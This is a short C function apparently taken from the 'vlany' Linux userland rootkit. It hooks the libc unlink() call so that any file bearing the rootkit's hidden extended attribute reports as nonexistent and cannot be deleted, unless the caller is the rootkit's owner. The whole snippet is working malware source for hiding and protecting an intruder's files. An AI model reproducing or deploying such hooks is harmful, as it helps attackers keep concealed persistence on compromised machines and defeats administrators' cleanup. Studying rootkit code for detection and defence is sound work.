int unlink(const char *pathname)
{
    #ifdef DEBUG
        printf("[vlany] unlink() called\n");
    #endif

    HOOK(old_unlink, CUNLINK);

    if(owned()) return old_unlink(pathname);

    if(hidden_xattr(pathname)) { errno = ENOENT; return -1; }

    return old_unlink(pathname);
}
